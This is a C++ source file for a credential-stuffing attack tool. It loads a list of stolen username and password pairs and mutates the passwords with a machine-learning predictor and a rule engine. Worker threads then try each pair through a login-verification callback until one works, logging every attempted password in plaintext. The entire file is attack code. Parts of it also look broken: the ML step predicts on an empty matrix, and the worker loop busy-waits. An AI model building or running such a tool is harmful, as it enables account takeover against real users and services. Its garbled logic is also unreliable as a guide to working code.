#include "credential_stuffing_attack.h"
#include <iostream>
#include <fstream>
#include <unordered_map>
#include <future>
#include <functional>
#include <armadillo>
#include <cmath>
#include <filesystem>

namespace fs = std::filesystem;

CredentialStuffingAttack::CredentialStuffingAttack(MLPredictor* mlPredictor, RuleEngine* ruleEngine, 
                                                   Logger* logger, ThreadingUtils* threadingUtils, 
                                                   DBManager* dbManager)
    : mlPredictor(mlPredictor), ruleEngine(ruleEngine), logger(logger), 
      threadingUtils(threadingUtils), dbManager(dbManager), credentialVerificationCallback(nullptr), stopFlag(false) {}

void CredentialStuffingAttack::setCredentialVerificationCallback(std::function<bool(const std::string&, const std::string&)> callback) {
    credentialVerificationCallback = callback;
}

std::future<void> CredentialStuffingAttack::loadCredentialsAsync() {
    logger->info("Loading stolen credentials asynchronously...", {"CredentialStuffing", "Loading"});
    std::string filePath = "path/to/stolen_credentials.txt";
    return std::async([this, filePath]() {
        auto stolenCredentials = loadStolenCredentials(filePath);
        applyMachineLearningModel(stolenCredentials);
        applyRulesToCredentials(stolenCredentials);

        for (const auto& pair : stolenCredentials) {
            std::unique_lock<std::mutex> lock(mtx);
            credentialsQueue.push(pair);
        }
        logger->info("Stolen credentials loaded and queued.", {"CredentialStuffing", "Loading"});
    });
}

std::unordered_map<std::string, std::string> CredentialStuffingAttack::loadStolenCredentials(const std::string& filePath) {
    std::unordered_map<std::string, std::string> stolenCredentials;
    std::ifstream file(filePath);
    std::string username, password;
    while (file >> username >> password) {
        stolenCredentials[username] = password;
    }
    logger->info("Stolen credentials loaded from " + filePath, {"CredentialStuffing", "Load"});
    return stolenCredentials;
}

void CredentialStuffingAttack::applyMachineLearningModel(std::unordered_map<std::string, std::string>& stolenCredentials) {
    arma::mat inputData; 
    for (auto& pair : stolenCredentials) {
        arma::Row<size_t> predictions = mlPredictor->predict(inputData);
        pair.second += "_" + std::to_string(predictions[0]);  
    }
    logger->info("Machine learning model applied to credentials.", {"CredentialStuffing", "ML"});
}

void CredentialStuffingAttack::applyRulesToCredentials(std::unordered_map<std::string, std::string>& stolenCredentials) {
    for (auto& pair : stolenCredentials) {
        auto transformed = ruleEngine->applyRules(pair.second);
        pair.second = transformed.empty() ? pair.second : transformed[0];  
    }
    logger->info("Rules applied to stolen credentials.", {"CredentialStuffing", "Rules"});
}

void CredentialStuffingAttack::logCredentialAttackDetails(const std::string& username, const std::string& password) {
    logger->trace("Attempting credential stuffing for user: " + username + " with password: " + password, {"CredentialStuffing", "Attack"});
}

void CredentialStuffingAttack::credentialsWorker() {
    while (!stopFlag) {
        std::pair<std::string, std::string> credential;
        {
            std::unique_lock<std::mutex> lock(mtx);
            if (credentialsQueue.empty()) {
                continue;
            }
            credential = credentialsQueue.front();
            credentialsQueue.pop();
        }

        logCredentialAttackDetails(credential.first, credential.second);

        if (credentialVerificationCallback && credentialVerificationCallback(credential.first, credential.second)) {
            stopFlag = true; 
        }

        if (checkIfStop()) break;
    }
}

bool CredentialStuffingAttack::checkIfStop() {
    return stopFlag;
}

void CredentialStuffingAttack::execute() {
    logger->info("Starting credential stuffing attack.", {"CredentialStuffing", "Execution"});

    auto future = loadCredentialsAsync();
    future.wait();  

    threadingUtils->enableMonitoring();

    std::vector<std::function<void()>> tasks;
    tasks.push_back([this]() { credentialsWorker(); });

    threadingUtils->runInParallel(tasks);

    stopFlag = true;

    threadingUtils->stopThreads();

    evaluateModel();
    analyzeErrors();
    manageResources();

    logger->info("Credential Stuffing Attack completed.", {"CredentialStuffing", "Execution"});
}

void CredentialStuffingAttack::evaluateModel() {
    logger->info("Evaluating model after credential stuffing attack.", {"CredentialStuffing", "Evaluation"});
    arma::mat inputData;
    arma::Row<size_t> trueLabels; 
    double accuracy = mlPredictor->evaluate(inputData, trueLabels);
    logger->info("Model accuracy: " + std::to_string(accuracy), {"CredentialStuffing", "Evaluation"});
}

void CredentialStuffingAttack::analyzeErrors() {
    logger->info("Analyzing errors after credential stuffing attack.", {"CredentialStuffing", "ErrorAnalysis"});
    mlPredictor->analyzeErrors("path/to/test_data.txt");
}

void CredentialStuffingAttack::manageResources() {
    logger->info("Managing resources after credential stuffing attack.", {"CredentialStuffing", "ResourceManagement"});
    mlPredictor->manageResources();
}





